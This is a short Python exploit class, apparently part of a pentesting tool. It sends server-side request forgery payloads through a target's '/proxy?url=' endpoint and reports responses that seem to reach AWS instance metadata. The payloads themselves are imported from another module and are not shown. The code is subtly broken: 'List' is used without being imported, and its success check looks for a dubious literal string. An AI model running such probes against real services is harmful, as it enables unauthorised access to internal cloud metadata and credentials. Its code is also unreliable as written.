import requests
from utils.payloads import SSRF_PAYLOADS

class SSRFExploiter:
    def __init__(self, target: str):
        self.target = target

    def test_ssrf(self) -> List[str]:
        vulnerabilities = []
        for payload in SSRF_PAYLOADS:
            try:
                response = requests.get(
                    f"{self.target}/proxy?url={payload}",
                    timeout=10
                )
                if "EC2_PRIVATE_IP" in response.text:
                    vulnerabilities.append(f"SSRF to AWS metadata: {payload}")
            except Exception as e:
                print(f"SSRF test failed: {e}")
        return vulnerabilities
